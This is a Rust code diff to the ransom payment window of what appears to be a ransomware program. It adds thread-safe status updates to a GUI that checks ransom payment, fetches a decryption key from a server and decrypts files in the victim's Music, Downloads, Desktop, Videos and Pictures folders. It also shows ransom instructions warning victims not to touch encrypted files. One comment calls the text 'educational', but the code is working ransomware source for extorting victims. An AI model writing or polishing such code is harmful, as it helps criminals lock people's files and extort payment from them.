@@ -3,6 +3,7 @@ use native_windows_derive::NwgUi;
 use nwg::NativeUi;
 use std::rc::Rc;
 use std::cell::RefCell;
+use std::sync::{Arc, Mutex};
 use sodiumoxide::crypto::box_::PublicKey;
 
 use crate::networking::client::{mark_paid, get_key, check_payment};
@@ -33,6 +34,12 @@ pub struct PaymentWindow {
     #[nwg_control(text: "", position: (20, 580), size: (580, 50), flags: "VISIBLE", readonly: true)]
     status_display: nwg::TextBox,
 
+    #[nwg_control]
+    #[nwg_events(OnNotice: [PaymentWindow::on_notice])]
+    notice: nwg::Notice,
+
+    status_msg: Arc<Mutex<String>>,
+
     pub_key: Rc<RefCell<Option<PublicKey>>>,
 }
 
@@ -40,6 +47,7 @@ impl PaymentWindow {
     fn close(&self) {
         nwg::stop_thread_dispatch();
     }
+
     fn make_payment(&self) {
         if let Some(pk) = self.pub_key.borrow().as_ref() {
             self.status_display.set_text("Processing payment... Please wait.");
@@ -70,6 +78,9 @@ impl PaymentWindow {
             self.status_display.set_text("Verifying payment status...");
             
             let pk_clone = pk.clone();
+
+            let notice = self.notice.sender();
+            let status_msg = self.status_msg.clone();
             
             tokio::spawn(async move {
                 let has_paid = match check_payment(&pk_clone).await {
@@ -81,11 +92,13 @@ impl PaymentWindow {
                 };
                 
                 if has_paid {
-                    println!("Good. Oof. Payment verified! Starting decryption...");
-                    
+                    *status_msg.lock().unwrap() = "Good. Oof. Payment verified! Starting decryption...".to_string();
+                    notice.notice();
+
                     match get_key(&pk_clone).await {
                                 Ok(secret_key) => {
-                                    println!("Starting file decryption process...");
+                                    *status_msg.lock().unwrap() = "Starting file decryption process...".to_string();
+                                    notice.notice();
                                     
                                     let paths = [FOLDERID_Music, FOLDERID_Downloads, FOLDERID_Desktop, FOLDERID_Videos, FOLDERID_Pictures];
                                     unsafe {
@@ -100,14 +113,16 @@ impl PaymentWindow {
                                             }
                                         }
                                     }
-                                    println!("Oof. Files successfully decrypted!");
+                                    *status_msg.lock().unwrap() = "Oof. Files successfully decrypted!".to_string();
+                                    notice.notice();
                                 },
                                 Err(e) => {
                                     println!("Oops. Error getting decryption key: {}", e);
                                 },
                             }
                 } else {
-                    println!("Hmm... Payment not confirmed yet. Try again in a moment.");
+                    *status_msg.lock().unwrap() = "Hmm... Payment not confirmed yet. Try again in a moment.".to_string();
+                    notice.notice();
                 }
             });
             
@@ -117,6 +132,11 @@ impl PaymentWindow {
         }
     }
 
+    fn on_notice(&self) {
+        let msg = self.status_msg.lock().unwrap().clone();
+        self.status_display.set_text(&msg);
+    }
+
     pub fn set_public_key(&self, pk: PublicKey) {
         *self.pub_key.borrow_mut() = Some(pk);
     }
@@ -124,12 +144,17 @@ impl PaymentWindow {
 
 pub fn show_payment_window(public_key: Option<PublicKey>) {
     nwg::init().expect("Failed to init Native Windows GUI");
+
+    let app = PaymentWindow {
+        status_msg: Arc::new(Mutex::new(String::new())),
+        ..Default::default()
+    };
     
-    let app = PaymentWindow::build_ui(Default::default()).expect("Failed to build UI");
+    let ui = PaymentWindow::build_ui(app).expect("Failed to build UI");
     
     // Set the public key if provided
     if let Some(pk) = public_key {
-        app.set_public_key(pk);
+        ui.set_public_key(pk);
     }
     
     // Set the instructions text - looks authentic but is educational
@@ -155,7 +180,7 @@ pub fn show_payment_window(public_key: Option<PublicKey>) {
         Do not modify or delete encrypted files as this may\r\n\
         make recovery impossible.";
     
-    app.instructions.set_text(instructions_text);
+    ui.instructions.set_text(instructions_text);
     
     // Set header font and styling 
     let mut font = nwg::Font::default();
@@ -165,9 +190,9 @@ pub fn show_payment_window(public_key: Option<PublicKey>) {
         .weight(700)
         .build(&mut font)
         .expect("Failed to build font");
-    app.header.set_font(Some(&font));
+    ui.header.set_font(Some(&font));
     
-    app.status_display.set_text("Ready! Follow the instructions above to get your files back. Good luck.");
+    ui.status_display.set_text("Ready! Follow the instructions above to get your files back. Good luck.");
     
     nwg::dispatch_thread_events();
 }
